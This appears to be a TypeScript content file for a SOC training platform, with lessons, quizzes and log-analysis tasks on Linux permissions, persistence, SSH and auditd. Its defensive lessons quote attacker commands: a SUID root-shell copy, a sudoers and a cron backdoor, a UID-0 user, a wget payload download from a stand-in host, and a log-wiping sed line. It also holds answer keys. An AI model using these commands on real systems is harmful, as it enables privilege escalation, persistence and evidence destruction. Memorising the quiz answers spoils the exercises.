read+execute, others: read+execute)\n- \`chmod 644 file\` = rw-r--r-- (owner: read+write, group: read, others: read) — standard for config files\n- \`chmod 777 file\` = rwxrwxrwx — **EVERYONE** can read, write, and execute. This is almost always a misconfiguration or a sign of an attacker deliberately weakening security.\n\n**SUID and SGID — Special Permission Bits**\nThese are advanced permission bits that are frequent attack targets:\n- **SUID (Set User ID)**: When set on an executable, it runs as the **file owner** regardless of who executes it. The classic example is \`/usr/bin/passwd\` — it runs as root (to write to /etc/shadow) even when an ordinary user runs it.\n  - ls shows 's' in the owner execute position: \`-rwsr-xr-x\`\n  - Dangerous if set on a shell or interpreter: \`find / -perm -4000\` lists all SUID files\n- **SGID (Set Group ID)**: Similar but runs as the file's group.\n\nAttackers sometimes copy \`/bin/bash\` to /tmp and set SUID on it: \`chmod 4755 /tmp/bash\`. Then any user can run \`/tmp/bash -p\` to get a root shell. Looking for unexpected SUID files is part of any Linux compromise investigation.\n\n**The sudo System**\n\n**sudo** (substitute user do) allows specific users to run commands as root (or as another user) without knowing the root password. It is configured in \`/etc/sudoers\` (edit only with \`visudo\` to prevent syntax errors that lock you out).\n\nExample sudoers entries:\n\`\`\`\nalice   ALL=(ALL:ALL) ALL         # alice can run anything as any user\nbob     ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx   # bob can restart nginx without a password\n%devops ALL=(ALL) ALL              # everyone in the devops group can run anything\n\`\`\`\n\nWhy sudo matters for security:\n1. **Audit trail**: Every sudo command is logged to \`/var/log/auth.log\` (or \`/var/log/secure\` on RHEL). This is how you know who ran what as root.\n2. **Attack target**: If an attacker can add their account to sudoers (or to the sudo/wheel group), they get permanent root access. Always monitor for changes to /etc/sudoers and /etc/group.\n3. **Common attacker escalation**: \`echo 'www-data ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/backdoor\` — if the web server is compromised and the attacker can write to sudoers.d, they get root.\n\nCheck current sudo privileges: \`sudo -l\` (shows what the current user can run as sudo).`,
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Reading 3 — Processes, Cron, and SSH
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "linux-fund-r3",
      heading: "Processes, Cron Jobs, SSH — Attacker Persistence on Linux",
      content: `Attackers do not want to be a one-time visitor — they want to come back whenever they choose. On Linux, the three most common persistence mechanisms are: processes (malware running continuously), cron jobs (scheduled malicious tasks), and SSH backdoors (added public keys). Knowing these lets you find persistence during an investigation.\n\n**Processes**\n\nEvery running program is a **process** with a unique **PID (Process ID)**. Processes have a parent-child relationship — when a process spawns another, the new process is its child. This forms a **process tree**.\n\nThe mother of all processes is **init** (PID 1, now typically systemd on modern Linux). Everything else descends from it. An attacker's malware process should logically descend from something — what is its parent? If \`kworker\` (which looks like a legitimate kernel worker) has a parent of \`bash\`, something renamed itself to hide.\n\nKey commands:\n- \`ps aux\` — shows all running processes. Columns: USER, PID, %CPU, %MEM, START, TIME, COMMAND.\n- \`ps auxf\` — shows the process tree (forest view)\n- \`pstree -p\` — visual process tree with PIDs\n- \`ls -la /proc/PID/exe\` — the real executable path for process PID (reveals malware that deleted its binary after starting)\n- \`cat /proc/PID/cmdline\` — full command line (null-separated, use \`tr '\\0' ' '\` to read)\n- \`lsof -p PID\` — all files and network connections open by PID\n- \`kill -9 PID\` — forcefully terminate a process (signal 9 = SIGKILL)\n\nSuspicious process indicators:\n- Process with a name resembling a system process (\`kworkerr\`, \`systemdd\`) but running from /tmp or /home\n- Process with no associated binary on disk (\`ls -la /proc/PID/exe\` → '(deleted)')\n- Process listening on an unusual port\n- Process using high CPU at odd hours\n\n**Cron — Scheduled Tasks**\n\n**cron** is the Linux task scheduler. It runs commands at specified times and intervals. Think of it like Windows Task Scheduler. Cron is a beloved attacker persistence tool because cron jobs survive reboots.\n\nCron configuration locations (all must be checked during an investigation):\n- \`/etc/crontab\` — system-wide cron table\n- \`/etc/cron.d/\` — directory of cron files (individual files per application/service)\n- \`/etc/cron.daily/\`, \`/etc/cron.hourly/\`, \`/etc/cron.weekly/\`, \`/etc/cron.monthly/\` — scripts run on those intervals\n- \`crontab -l\` — list the current user's personal cron jobs\n- \`crontab -l -u alice\` — list alice's cron jobs (as root)\n- \`/var/spool/cron/crontabs/\` — where user crontabs are stored on disk\n\nCron time format: \`* * * * * command\` = minute, hour, day of month, month, day of week.\n- \`*/5 * * * * /tmp/.update\` — run /tmp/.update every 5 minutes. This is malicious.\n- \`0 3 * * * /bin/bash /home/alice/.bashrc.d/sync.sh\` — runs a script at 3 AM daily. Worth checking what that script does.\n\nAttacker cron persistence: \`echo '* * * * * /tmp/.update 2>/dev/null' >> /etc/cron.d/sysupdate\`\n\n**SSH — Secure Shell**\n\nSSH is how administrators remotely log into Linux servers. It is also an attacker's preferred remote access method because SSH connections are encrypted and blend in with legitimate admin traffic.\n\nKey SSH files:\n- \`/etc/ssh/sshd_config\` — SSH server configuration:\n  - \`PermitRootLogin no/yes\` — should be 'no' on production servers (attackers try to log in as root directly)\n  - \`PasswordAuthentication yes/no\` — password-based SSH should be disabled if key-based auth is available\n  - \`AllowUsers alice bob\` — whitelist of allowed users\n- \`~/.ssh/authorized_keys\` — public SSH keys that are allowed to log in as this user WITHOUT a password\n- \`~/.ssh/known_hosts\` — SSH servers this user has previously connected to\n- \`~/.bash_history\` — history of commands the user ran\n\n**SSH Backdoor — Most Common Attacker Persistence**\nAn attacker who gains temporary access to a Linux system often adds their own SSH public key to \`/root/.ssh/authorized_keys\` or \`/home/alice/.ssh/authorized_keys\`. This gives them permanent, password-free SSH access even after the original vulnerability is patched.\n\nInvestigation checklist:\n- \`cat /root/.ssh/authorized_keys\` — are there keys that do not belong?\n- \`cat /home/*/.ssh/authorized_keys\` — check all users\n- \`find /home -name authorized_keys -newer /etc/passwd\` — recently modified authorized_keys files\n- Compare with your known-good baseline if available\n\n**Package Management — What Gets Installed**\n\n- Debian/Ubuntu: \`apt\` — installs packages to standard paths (\`/usr/bin/\`, \`/usr/share/\`, etc.)\n- RHEL/CentOS/Fedora: \`yum\` or \`dnf\`\n- Check installed packages: \`dpkg -l\` (Debian) or \`rpm -qa\` (RHEL)\n- Attackers sometimes install tools via the package manager: \`apt install nmap netcat socat masscan\` — these would appear in the package list and in package manager logs.`,
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Question 1
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "linux-fund-q1",
      question:
        "During a Linux investigation, you run 'find / -perm -4000 -type f 2>/dev/null' and find '/tmp/update_helper' in the results. Why is this significant?",
      options: [
        "SUID files in /tmp are completely normal — many programs install temporary helpers there",
        "The SUID bit (/perm -4000) means this file runs as its owner (likely root) regardless of who executes it. A SUID executable in /tmp (not a standard system location) strongly suggests an attacker planted a privilege escalation backdoor",
        "Files in /tmp cannot be executed, so this is not a security concern",
        "The find command found a corrupted file and it should be deleted immediately without investigation",
      ],
      answer: 1,
      explanation:
        "The SUID (Set User ID) bit causes a program to execute as the file's owner, not the current user. Legitimate SUID binaries (like /usr/bin/passwd, /usr/bin/sudo) live in standard system directories. An SUID file in /tmp with an innocent-looking name is a major red flag — it is almost certainly an attacker backdoor that allows any user to run commands as root. Investigate with 'ls -la /tmp/update_helper' and 'file /tmp/update_helper' before doing anything else.",
      xp: 30,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Log Analysis — Suspicious sudo (linux_execve / sudo_command)
    // -------------------------------------------------------------------------
    {
      type: "log_analysis",
      id: "linux-fund-la1",
      heading: "Suspicious sudo Command Detected",
      context:
        "Your SIEM generated an alert: 'Privileged command execution detected on web-srv-01'. The auditd system on the server captured this event. The user 'www-data' is the web application service account — it should NEVER need to run interactive commands. Review the event.",
      event: {
        id: "linux-sudo-evt-001",
        ts: "2024-11-18T14:22:09.000Z",
        source: "linux_audit",
        vendor: "Linux auditd",
        event_type: "sudo_command",
        severity: "critical",
        hostname: "web-srv-01.corp.internal",
        description:
          "Service account www-data executed sudo bash — likely post-exploitation privilege escalation",
        mitre_technique: "T1548.003",
        mitre_tactic: "Privilege Escalation",
        process: {
          name: "sudo",
          pid: 9823,
          path: "/usr/bin/sudo",
          parent_name: "sh",
          parent_pid: 9821,
          cmdline: "sudo bash",
          user: "www-data",
        },
        raw: {
          "auditd.log.type": "SYSCALL",
          "auditd.log.uid": "33",
          "auditd.log.auid": "33",
          "auditd.log.euid": "0",
          "auditd.log.exe": "/usr/bin/sudo",
          "auditd.log.comm": "sudo",
          "auditd.log.key": "privileged_command",
          "auditd.log.success": "yes",
          "auditd.log.arch": "x86_64",
          "auditd.log.syscall": "execve",
          "process.args": ["sudo", "bash"],
          "host.os.type": "linux",
          "host.hostname": "web-srv-01.corp.internal",
          "@timestamp": "2024-11-18T14:22:09.000Z",
        },
      } satisfies TelemetryEvent,
      questions: [
        {
          question:
            "The auditd.log.uid is '33' and auditd.log.euid is '0'. What does this tell you about what just happened?",
          options: [
            "UID 33 is root — the command ran as a normal user and nothing escalated",
            "UID 33 is www-data (the web server service account). eUID 0 means the effective user ID after sudo ran is 0 (root). The web server process successfully elevated to root — this indicates the web server was compromised and an attacker used it to escalate privileges",
            "UID 33 means the process failed — the sudo attempt was blocked",
            "UID 33 is an anonymous guest account — this is normal web traffic being logged",
          ],
          answer: 1,
          explanation:
            "On Debian/Ubuntu systems, UID 33 = www-data (the web server user). The auditd 'uid' field shows who STARTED the command (www-data), and 'euid' (effective UID) shows who it ran AS after privilege change — euid 0 = root. This means the sudo command succeeded and gave the www-data process root access. Since www-data should only serve web content and never need root, this strongly indicates a web application vulnerability was exploited (e.g., RCE via SQL injection or file upload) and the attacker escalated to root.",
          xp: 35,
        },
      ],
    } satisfies LogAnalysisTask,

    // -------------------------------------------------------------------------
    // Flag Task
    // -------------------------------------------------------------------------
    {
      type: "flag",
      id: "linux-fund-flag1",
      prompt:
        "Look at the log analysis event above. What command was run with sudo? Look at the 'process.args' field in the raw log. Enter the command that was executed after sudo (the argument that was passed to sudo).",
      answer: "bash",
      hint: "The process.args field shows the full command as an array: ['sudo', 'bash']. The command run AS root (the argument passed to sudo) is the second element.",
      xp: 25,
    } satisfies FlagTask,

    // -------------------------------------------------------------------------
    // Question 2
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "linux-fund-q2",
      question:
        "What does 'chmod 777 /etc/shadow' mean, and why would this be catastrophic on a Linux server?",
      options: [
        "chmod 777 sets the file to read-only for everyone — this is the safest possible setting",
        "chmod 777 grants read, write, and execute permission to owner, group, AND every other user on the system. /etc/shadow contains password hashes for all users. Making it world-readable means any user — including an attacker with a low-privilege account — can read and attempt to crack every user's password hash offline",
        "chmod 777 deletes the file — this would remove all passwords and lock everyone out",
        "chmod 777 only changes the file's owner — it does not affect who can read the file",
      ],
      answer: 1,
      explanation:
        "In octal permission notation: 7 = rwx (4+2+1). chmod 777 = rwxrwxrwx — full read/write/execute for everyone. /etc/shadow is one of the most security-critical files on a Linux system, normally readable only by root (chmod 640 or 000). Making it world-readable (7 for 'others') would allow any unprivileged user or malware to read all password hashes, download them, and crack them offline using hashcat or john the ripper. This is why monitoring file permission changes on sensitive files like /etc/shadow, /etc/sudoers, and /etc/passwd is essential.",
      xp: 30,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Question 3
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "linux-fund-q3",
      question:
        "An analyst finds this line in /etc/cron.d/sysupdate on a compromised web server: '*/5 * * * * root /tmp/.cache 2>/dev/null'. What does this do and why is it malicious?",
      options: [
        "It updates the system cache every 5 minutes as root — this is a legitimate maintenance task",
        "Every 5 minutes, the root user executes /tmp/.cache (a hidden file in /tmp — note the dot prefix). The 2>/dev/null suppresses any error output. This is a persistent backdoor — even if the malware process is killed, cron will restart it within 5 minutes. Hiding in /tmp with a dotfile name is classic attacker tradecraft",
        "The cron job runs as the 'root' group (not root user) and only has read permission on /tmp",
        "*/5 means the job runs once every 5 hours, not every 5 minutes, so the impact is limited",
      ],
      answer: 1,
      explanation:
        "Cron time format: minute hour day month weekday. '*/5 * * * *' means 'every 5 minutes'. The user field is 'root', so it runs as the root superuser. '/tmp/.cache' is a hidden file (dot prefix) in /tmp — two red flags: /tmp is world-writable (attackers write there), and the dot prefix hides it from 'ls' without the -a flag. '2>/dev/null' hides error output. This is textbook attacker cron persistence — it survives process kills and reboots. Response: kill the /tmp/.cache process, delete the file, remove /etc/cron.d/sysupdate, then investigate how the attacker gained access in the first place.",
      xp: 30,
    } satisfies QuestionTask,
  ],
};

// ---------------------------------------------------------------------------
// Room 4 — Linux Log Analysis
// ---------------------------------------------------------------------------

const linuxLogAnalysis: Room = {
  id: "linux-log-analysis",
  title: "Linux Log Analysis",
  description:
    "Learn to read the logs Linux systems generate and identify attack patterns: SSH brute force, privilege escalation, persistence via cron, and web application attacks. Master auth.log, auditd, and journald.",
  difficulty: "intermediate",
  category: "Log Analysis",
  estimatedMinutes: 45,
  xp: 400,
  icon: "🔍",
  prerequisites: ["linux-fundamentals"],
  tasks: [
    // -------------------------------------------------------------------------
    // Reading 1 — The Linux Logging Ecosystem
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "linux-logs-r1",
      heading: "The Linux Logging Ecosystem — Where Every Event Gets Written",
      content: `If Windows Event Logs are the black box of a Windows system, then the files in \`/var/log/\` are the black box of a Linux system. But Linux logging is more decentralised — different components write to different files, and you need to know which file contains which type of event. Think of it like a hospital: the admissions desk logs patient arrivals (auth.log), the pharmacy logs prescriptions (application logs), and the ICU has its own records (kernel log). You need to know which department to check based on what you are investigating.\n\n**The Three Layers of Linux Logging**\n\n**Layer 1: syslog / rsyslog**\nThe original Unix logging system. Programs send log messages to the \`syslog\` facility using a standard format. The syslog daemon (\`rsyslogd\` on most modern systems) receives these messages and routes them to the appropriate files based on **facility** (auth, kern, daemon, etc.) and **severity** (emerg, alert, crit, err, warning, notice, info, debug).\n\nConfiguration: \`/etc/rsyslog.conf\` and files in \`/etc/rsyslog.d/\`\n\n**Layer 2: systemd journal (journald)**\nOn modern Linux systems (Ubuntu 16+, RHEL 7+, Debian 8+), **systemd-journald** collects logs from all systemd units (services), the kernel, and early boot. It stores them in a binary format in \`/run/log/journal/\`. You query it with the \`journalctl\` command:\n- \`journalctl -u sshd\` — all SSH service logs\n- \`journalctl -p err\` — only error-level and above\n- \`journalctl --since "2024-11-14 00:00" --until "2024-11-14 23:59"\` — time range\n- \`journalctl -f\` — follow (like tail -f)\n- \`journalctl -u sshd -n 50\` — last 50 lines of SSH logs\n\n**Layer 3: auditd**\nThe Linux Audit Framework is a separate, security-focused logging system that hooks into the kernel. Unlike syslog (which depends on userspace programs to call syslog), auditd monitors system calls at the kernel level — meaning it is very hard to evade. It logs to \`/var/log/audit/audit.log\` (or sometimes \`audit/\` directory).\n\n**Key Log Files and What They Contain**\n\n**\`/var/log/auth.log\`** (Debian/Ubuntu) or **\`/var/log/secure\`** (RHEL/CentOS)\nThis is your primary investigation target for authentication events:\n- SSH successful logins: \`Accepted password for alice from 10.0.0.5 port 42341 ssh2\`\n- SSH failed logins: \`Failed password for root from 185.220.101.45 port 56234 ssh2\`\n- Invalid usernames: \`Invalid user admin from 185.220.101.45 port 45678\`\n- Sudo events: \`sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/cat /etc/shadow\`\n- PAM (Pluggable Authentication Module) events: password changes, account lockouts\n- su (switch user) events\n\n**\`/var/log/syslog\`** (Debian/Ubuntu) or **\`/var/log/messages\`** (RHEL)\nGeneral system log. Services log start/stop events here. Can contain:\n- cron job executions: \`CRON[12345]: (root) CMD (/tmp/.cache)\`\n- Network interface changes\n- Service restarts\n- General daemon activity\n\n**\`/var/log/kern.log\`**\nKernel messages — hardware issues, driver errors, OOM (Out of Memory) kills. For security, useful for detecting kernel-level rootkits or unusual kernel module loading.\n\n**\`/var/log/cron\`** or \`/var/log/syslog\` (cron messages go here on Debian)\nCron job execution records. Every time cron runs a job, it logs it here. During an investigation, check if any unexpected cron jobs ran (especially at unusual hours).\n\n**\`/var/log/apache2/\`** (Apache) or **\`/var/log/nginx/\`** (Nginx)\n- **access.log**: Every HTTP request — client IP, timestamp, URL, HTTP method, response code, user agent\n- **error.log**: Application errors, 404s that might indicate scanning, PHP errors that might reveal injection attempts\n\nApache access.log format example:\n\`\`\`\n192.168.1.100 - - [14/Nov/2024:10:32:01 +0000] "GET /admin/config.php HTTP/1.1" 200 4521 "-" "Mozilla/5.0..."\n       ^                  ^                      ^                          ^     ^\n   Client IP          Timestamp              Request                   Status  Bytes\n\`\`\`\n\n**\`/var/log/faillog\`**\nFailed login counts per user account. Can be viewed with the \`faillog\` command. Shows which accounts are being targeted by brute force.\n\n**Useful Log Analysis Commands**\n\n\`\`\`bash\n# Count failed SSH attempts by source IP\ngrep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -20\n\n# Show successful SSH logins\ngrep "Accepted" /var/log/auth.log\n\n# Show all sudo commands run in the last week\ngrep "sudo:" /var/log/auth.log | grep "COMMAND"\n\n# Watch auth.log in real time during an attack\ntail -f /var/log/auth.log\n\n# Find all cron jobs that ran today\ngrep "$(date +%b\\ %e)" /var/log/syslog | grep CRON\n\`\`\``,
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Reading 2 — SSH Attack Detection
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "linux-logs-r2",
      heading: "SSH Attack Detection — Reading the Patterns in auth.log",
      content: `SSH (Secure Shell) is the standard way administrators manage Linux servers remotely. It is also one of the most commonly attacked services on the internet. Every day, internet-facing SSH servers receive thousands of automated login attempts from bots scanning for weak passwords. Learning to distinguish between a background noise of automated scanning and a targeted, successful attack is a core SOC skill.\n\n**The Anatomy of SSH Log Entries**\n\nSSH logs four types of authentication events in auth.log/secure:\n\n1. **Successful password login**:\n   \`Nov 14 10:32:01 web-srv-01 sshd[1234]: Accepted password for alice from 10.0.0.5 port 42341 ssh2\`\n\n2. **Successful key-based login**:\n   \`Nov 14 10:35:22 web-srv-01 sshd[1235]: Accepted publickey for admin from 10.10.0.100 port 55123 ssh2: RSA SHA256:abc123...\`\n\n3. **Failed password attempt**:\n   \`Nov 14 02:17:33 web-srv-01 sshd[9823]: Failed password for root from 185.220.101.45 port 56234 ssh2\`\n\n4. **Invalid username attempt**:\n   \`Nov 14 02:17:34 web-srv-01 sshd[9824]: Invalid user admin from 185.220.101.45 port 45679\`\n\n**Pattern 1: Automated Brute Force Scanning**\n\nCharacteristics:\n- Hundreds or thousands of failures from a single IP in a short time\n- Targets common usernames: root, admin, ubuntu, ec2-user, pi, postgres, oracle\n- Rapid succession (sometimes multiple per second)\n- Source IP typically from known scanner/Tor exit node address ranges\n- No successful login follows\n\nThis is background noise. Most production servers see this constantly. The appropriate response is to use **fail2ban** (automatically blocks IPs after N failures) or restrict SSH to specific source IPs via firewall.\n\n**Pattern 2: Targeted Credential Attack (More Dangerous)**\n\nCharacteristics:\n- Slower pace (one attempt every few seconds or minutes) — deliberately avoiding rate limiting\n- Targets specific, real usernames for that organisation (not generic names like root/admin)\n- Source IP may rotate (using proxies or multiple hosts)\n- Eventually a successful logon appears\n\nThis suggests the attacker has intelligence about the target — possibly obtained usernames from a breach, LinkedIn, or a previous enumeration phase.\n\n**Pattern 3: Successful Login After Failures (Critical)**\n\nThis is what you are really hunting for:\n\`\`\`\nFailed password for alice from 185.220.101.45 port 51234 ssh2\nFailed password for alice from 185.220.101.45 port 51235 ssh2\nFailed password for alice from 185.220.101.45 port 51236 ssh2\nAccepted password for alice from 185.220.101.45 port 51237 ssh2\n\`\`\`\n\nA successful login from the same IP that just had multiple failures is a high-confidence indicator of a successful brute force attack. Investigate immediately:\n- What did this session do? Check auditd logs for commands run during this session.\n- Was this IP seen elsewhere in your environment?\n- Was alice's account used after this from any other IP (could indicate credential sharing)?\n\n**Pattern 4: Impossible Geographic Login**\n\n\`\`\`\nNov 14 09:15:22 Accepted password for alice from 10.5.1.100 port 44123 (New York, USA)\nNov 14 09:47:11 Accepted password for alice from 185.220.101.45 port 56234 (Moscow, Russia)\n\`\`\`\n\nAlice logged in from New York at 09:15 and from Moscow at 09:47 — 32 minutes apart. It is physically impossible to travel between these locations in 32 minutes. This is called **Impossible Travel** and strongly indicates account compromise — a threat actor is using Alice's stolen credentials.\n\n**auditd — Kernel-Level Command Auditing**\n\nWhile auth.log tells you WHO logged in via SSH, **auditd** tells you WHAT they did once inside. The Linux Audit Framework captures system calls at the kernel level:\n\nAudit rules file: \`/etc/audit/audit.rules\` or \`/etc/audit/rules.d/\`\n\nCommon rules SOC teams enable:\n\`\`\`\n# Monitor execution of all commands\n-a always,exit -F arch=b64 -S execve -k exec_commands\n\n# Monitor privilege escalation\n-a always,exit -F arch=b64 -S execve -F euid=0 -k privileged_command\n\n# Monitor changes to sensitive files\n-w /etc/passwd -p wa -k identity_change\n-w /etc/sudoers -p wa -k sudoers_change\n-w /etc/shadow -p wa -k shadow_change\n-w /var/spool/cron -p wa -k cron_change\n\n# Monitor SSH authorized_keys\n-w /root/.ssh -p wa -k ssh_key_change\n\`\`\`\n\nQuerying auditd logs:\n- \`ausearch -k privileged_command\` — find all events with the key "privileged_command"\n- \`ausearch -m EXECVE -ts today\` — all executed commands today\n- \`aureport --auth\` — authentication summary report\n- \`aureport --exe --summary\` — summary of executed programs\n\nAuditd event structure (SYSCALL record):\n\`\`\`\ntype=SYSCALL msg=audit(1731550929.123:456): arch=c000003e syscall=59 success=yes exit=0 \\\n  a0=7f... a1=0 a2=0 a3=0 items=2 ppid=9821 pid=9823 auid=33 uid=33 gid=33 euid=0 egid=0 \\\n  suid=0 sgid=0 fsuid=0 fsgid=0 tty=pts0 ses=42 comm="sudo" exe="/usr/bin/sudo" key="privileged_command"\n\`\`\`\n\nKey fields: \`auid\` (original logged-in user — stays the same even after su/sudo), \`uid\` (current user), \`euid\` (effective user — 0=root after sudo), \`exe\` (executable path), \`key\` (audit rule that matched).`,
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Reading 3 — Common Attack Indicators in Linux Logs
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "linux-logs-r3",
      heading: "Common Attack Indicators in Linux Logs",
      content: `As a SOC analyst, you will develop an eye for anomalies — log entries that stand out because they are unusual, suspicious, or simply wrong. Here is a compilation of the most important attack indicators to look for across Linux log files.\n\n**Authentication Indicators**\n\n- **Multiple 'Failed password for root'** from the same external IP: Automated brute force against the root account. Common and usually noise, but track if intensity increases or switches to valid usernames.\n- **'Accepted password for root'** from any external IP: Very suspicious. Root SSH login should be disabled (\`PermitRootLogin no\`). If you see a successful root login from an external IP, treat it as a critical incident immediately.\n- **'Failed password for invalid user X'**: The username X does not exist. Attacker is guessing usernames. Compile a list of attempted usernames — they may reveal attacker knowledge about your organisation's naming convention.\n- **Sudden stop in SSH failures followed by successful login**: Brute force succeeded. Investigate the session.\n- **SSH login from a new country for a known user**: Possible credential theft. Cross-reference with business travel records.\n\n**Privilege Escalation Indicators**\n\n- **sudo: user NOT in sudoers file**: \`sudo: alice : user NOT in the sudoers file ; This incident will be reported\`. A user tried to run sudo but is not authorised. Could be an attacker trying privilege escalation with a compromised low-priv account.\n- **sudo command = 'bash', 'sh', 'su'**: \`sudo bash\` or \`sudo su -\` spawns an unrestricted root shell. Legitimate admins occasionally do this, but it should be rare and expected.\n- **Modification of /etc/sudoers or /etc/sudoers.d/**: auditd key 'sudoers_change'. Any modification is extremely sensitive.\n- **New user added with UID 0**: \`useradd -u 0 -o backdoor\` creates a second root account. Look for new entries in /etc/passwd with UID 0.\n\n**Persistence Indicators**\n\n- **New cron entries appearing in /var/spool/cron/ or /etc/cron.d/**: auditd key 'cron_change'. Legitimate cron additions are usually documented changes. Unexpected ones are red flags.\n- **wget or curl commands downloading to /tmp**: \`wget http://attacker.com/payload -O /tmp/.x\` — downloading a payload. Check web server logs if the download source is internal.\n- **chmod +x or chmod 4755 on files in /tmp**: Making downloaded files executable, or adding SUID.\n- **New entries in ~/.ssh/authorized_keys**: SSH backdoor. auditd 'ssh_key_change' key.\n- **New service enabled**: \`systemctl enable malicious.service\`\n\n**Lateral Movement and Exfiltration Indicators**\n\n- **SSH outbound from a server** (not a workstation): Servers should not be initiating SSH connections to external IPs. This is a common sign of a compromised server being used as a pivot point.\n- **curl/wget to external IPs from a server** that normally only serves web traffic: Possible data exfiltration or C2 beacon.\n- **Large data transfers detected in web server access.log**: POST requests with large body sizes to unusual endpoints could be exfiltration via the web application.\n- **New listening ports**: \`netstat -tulpn\` or \`ss -tulpn\` shows a new port listening that was not there before — possible backdoor shell.\n\n**Log Tampering Indicators**\n\n- **Timestamps jump or gap**: If auth.log shows 10:00 then jumps to 14:00 with no entries, someone may have deleted log lines with \`sed -i '/root/d' /var/log/auth.log\`.\n- **Log file modification time is newer than last entries**: The file was written after the last log entry — possible log editing.\n- **auditd reports file open for write on /var/log/auth.log**: An attacker editing the log file.\n- **journald logs show gaps**: Systemd journal has sequence numbers — gaps indicate tampering.\n\n**Investigation Workflow for Linux Incidents**\n\n1. **Confirm the scope**: Which machine? What time did suspicious activity start? Is this one machine or many?\n2. **Check authentication first**: auth.log — who logged in, when, from where? Any sudo activity?\n3. **Check processes**: \`ps aux\` — any unexpected processes running from /tmp or with suspicious names?\n4. **Check network connections**: \`ss -tulpn\` / \`netstat -tulpn\` — any unexpected listening ports or outbound connections?\n5. **Check persistence**: crontabs, /etc/cron.d, systemd services, authorized_keys\n6. **Check auditd**: What commands were run? Any file modifications to sensitive files?\n7. **Preserve evidence**: If this is a serious incident, take a memory dump and disk image before any remediation. Evidence preservation comes before cleanup.\n8. **Remediate**: Block attacker access (change passwords, remove SSH keys, remove cron jobs), patch the exploited vulnerability, monitor for re-entry.`,
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Question 1
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "linux-logs-q1",
      question:
        "What is the key difference between /var/log/auth.log (Debian/Ubuntu) and /var/log/audit/audit.log (auditd), and why does a SOC team need both?",
      options: [
        "They contain exactly the same information — having both is redundant",
        "auth.log contains authentication events logged by userspace daemons (sshd, sudo, PAM). audit.log is written by the Linux kernel via auditd and captures system calls — auth.log can be selectively cleared by a malicious process, but auditd is much harder to tamper with because it operates at kernel level. Together they give both readable context and tamper-resistant kernel-level detail",
        "auth.log is for SSH only, while audit.log is for sudo only — together they cover all authentication",
        "audit.log is only available on RHEL/CentOS systems and auth.log only on Debian/Ubuntu — you use whichever applies to your OS",
      ],
      answer: 1,
      explanation:
        "auth.log is produced by userspace processes (sshd, sudo, PAM) and is a regular file that can be modified or cleared. auditd hooks into the Linux kernel's audit subsystem — its log entries include kernel-generated sequence numbers and are written via a dedicated kernel interface that is much more difficult for an attacker to tamper with. Together they are complementary: auth.log gives human-readable event context, auditd gives kernel-verified command execution records. For forensics, auditd's 'auid' (audit user ID) field tracks the original login even after sudo/su changes.",
      xp: 30,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Log Analysis — SSH Brute Force
    // -------------------------------------------------------------------------
    {
      type: "log_analysis",
      id: "linux-logs-la1",
      heading: "SSH Brute Force Attack Against Web Server",
      context:
        "Your SIEM alert fires: 'SSH Brute Force — 312 failed authentication attempts in 4 minutes on web-srv-01'. You pull a representative event from the cluster. The pattern has continued for 4 minutes with no successful logins yet, but the attempt rate is still increasing.",
      event: {
        id: "linux-ssh-brute-evt-001",
        ts: "2024-11-22T03:41:09.000Z",
        source: "linux_audit",
        vendor: "Linux auditd",
        event_type: "ssh_failed",
        severity: "high",
        hostname: "web-srv-01.corp.internal",
        description:
          "Failed SSH password attempt for root — part of high-volume brute force campaign",
        mitre_technique: "T1110.001",
        mitre_tactic: "Credential Access",
        src_ip: "185.220.101.45",
        geo: { country: "Germany", city: "Frankfurt" },
        raw: {
          "log.file.path": "/var/log/auth.log",
          "message": "Failed password for root from 185.220.101.45 port 56234 ssh2",
          "syslog.hostname": "web-srv-01",
          "syslog.program": "sshd",
          "syslog.pid": 1234,
          "syslog.facility": "auth",
          "syslog.severity": "info",
          "event.type": "authentication_failure",
          "event.outcome": "failure",
          "user.name": "root",
          "source.ip": "185.220.101.45",
          "source.port": 56234,
          "@timestamp": "2024-11-22T03:41:09.000Z",
        },
      } satisfies TelemetryEvent,
      questions: [
        {
          question:
            "The target username is 'root' and the time is 03:41 AM. What is the immediate risk, and what should be the first containment action?",
          options: [
            "There is no risk — root SSH login is disabled by default and this is just noise",
            "The risk is that the brute force may eventually find the root password if PermitRootLogin is enabled and the password is weak. The immediate containment action is to block 185.220.101.45 at the firewall, and verify that /etc/ssh/sshd_config has 'PermitRootLogin no' to prevent root login even if the password is discovered",
            "Delete the root account immediately to prevent login",
            "Restart the SSH service to force all connections to drop",
          ],
          answer: 1,
          explanation:
            "While modern SSH configs should have PermitRootLogin disabled, you cannot assume this is the case until you verify. The two-step response is: (1) block the attacker IP at the firewall immediately to stop the ongoing attack, and (2) verify sshd_config to confirm root login is disabled and password authentication is restricted. Also check if there is an Accepted password/publickey entry from this IP anywhere in auth.log — if so, the attack may have succeeded before the alert fired.",
          xp: 30,
        },
        {
          question:
            "What log query would best help you determine if the brute force SUCCEEDED at any point and the attacker got in?",
          options: [
            "grep 'Failed password' /var/log/auth.log | wc -l — to count how many failures there were",
            "grep 'Accepted' /var/log/auth.log | grep '185.220.101.45' — to look for any successful authentication from the attacker's IP",
            "cat /etc/shadow | grep root — to check if the root password is set",
            "netstat -tulpn — to check which ports are open on the server",
          ],
          answer: 1,
          explanation:
